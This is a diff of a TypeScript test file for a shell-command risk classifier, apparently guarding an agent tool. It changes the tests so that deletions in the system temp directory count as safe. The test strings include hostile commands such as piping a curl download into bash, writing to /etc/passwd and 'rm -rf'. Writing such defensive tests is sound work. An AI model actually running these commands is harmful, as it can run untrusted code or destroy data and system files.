@@ -38,11 +38,10 @@ describe('assessCommandRisk shell AST', () => {
     expect(level).toBe('blocked')
   })
 
-  it('sudo bash -c "rm -rf /tmp/x" 解析内层 rm', async () => {
+  it('sudo bash -c "rm -rf /tmp/x" 解析内层 rm（临时目录自由区 → safe）', async () => {
     const d = await assessCommandRiskDetailed('sudo bash -c "rm -rf /tmp/x"')
     expect(d.parsed).toBe(true)
-    expect(d.level).toBe('dangerous')
-    expect(d.calls.some(c => c.reasons.some(r => r.includes('工作区外') || r.includes('rm')))).toBe(true)
+    expect(d.level).toBe('safe')
   })
 
   it('curl http://x.com | bash 标记 dangerous', async () => {
@@ -68,17 +67,40 @@ describe('assessCommandRisk shell AST', () => {
     const scratch = getScratchPath()
     const src = path.join(scratch, 'doc.txt')
     fs.writeFileSync(src, 'x')
-    const outside = path.join(os.tmpdir(), `sft-outside-${Date.now()}`, 'dest')
+    // 用家目录下非 tmp 路径，避免落入系统临时自由区
+    const outside = path.join(os.homedir(), `.sft-outside-${Date.now()}`, 'dest')
     fs.mkdirSync(path.dirname(outside), { recursive: true })
     const d = await assessCommandRiskDetailed(`cp "${src}" "${outside}"`, { cwd: scratch })
     expect(d.level).toBe('safe')
+    fs.rmSync(path.dirname(outside), { recursive: true, force: true })
   })
 
-  it('rm 到工作区外仍为 dangerous（命令级危险，不因 outside 降级）', async () => {
-    const outside = path.join(os.tmpdir(), `sft-rm-out-${Date.now()}`, 'target.txt')
+  it('rm 到工作区外（非临时目录）仍为 dangerous', async () => {
+    const outside = path.join(os.homedir(), `.sft-rm-out-${Date.now()}`, 'target.txt')
     fs.mkdirSync(path.dirname(outside), { recursive: true })
     fs.writeFileSync(outside, 'x')
-    expect(await assessCommandRisk(`rm -f "${outside}"`)).toBe('dangerous')
+    const d = await assessCommandRiskDetailed(`rm -f "${outside}"`)
+    expect(d.level).toBe('dangerous')
+    expect(d.calls.some(c => c.reasons.some(r => r.includes('高危命令') || r.includes('High-risk')))).toBe(true)
+    expect(d.calls.some(c => c.reasons.some(r => r.includes('工作区外') && r.includes('需确认')))).toBe(false)
+    fs.rmSync(path.dirname(outside), { recursive: true, force: true })
+  })
+
+  it('rm /tmp 临时文件降为 safe（系统临时目录自由区）', async () => {
+    const target = path.join(os.tmpdir(), `sft-tmp-rm-${Date.now()}.txt`)
+    fs.writeFileSync(target, 'x')
+    expect(await assessCommandRisk(`rm -f "${target}"`)).toBe('safe')
+    // 可能已被评估为可执行而未删；清理兜底
+    try { fs.unlinkSync(target) } catch { /* ignore */ }
+  })
+
+  it('复合命令：echo>/tmp && rm /tmp 整体 safe', async () => {
+    const f = `/tmp/sailfish_test_${Date.now()}.txt`
+    expect(
+      await assessCommandRisk(
+        `echo "x" > "${f}" && cat "${f}" && rm "${f}" && echo done`,
+      ),
+    ).toBe('safe')
   })
 
   it('echo ok > /etc/passwd 写重定向 blocked（整串规则兜底）', async () => {
@@ -319,8 +341,11 @@ describe('assessCommandRisk shell AST', () => {
       expect(await assessCommandRisk('kill -9 1', relaxed)).toBe('moderate')
       expect(await assessCommandRisk('systemctl stop nginx', relaxed)).toBe('moderate')
       expect(await assessCommandRisk('crontab -r', relaxed)).toBe('moderate')
-      expect(await assessCommandRisk('chmod +x /tmp/x', relaxed)).toBe('moderate')
-      expect(await assessCommandRisk('chgrp wheel /tmp/x', relaxed)).toBe('moderate')
+      const homeFile = path.join(os.homedir(), `.sft-chmod-${Date.now()}.txt`)
+      fs.writeFileSync(homeFile, 'x')
+      expect(await assessCommandRisk(`chmod +x "${homeFile}"`, relaxed)).toBe('moderate')
+      expect(await assessCommandRisk(`chgrp wheel "${homeFile}"`, relaxed)).toBe('moderate')
+      fs.unlinkSync(homeFile)
     })
 
     it('chmod /etc 仍升 dangerous（路径守卫 hardened）', async () => {
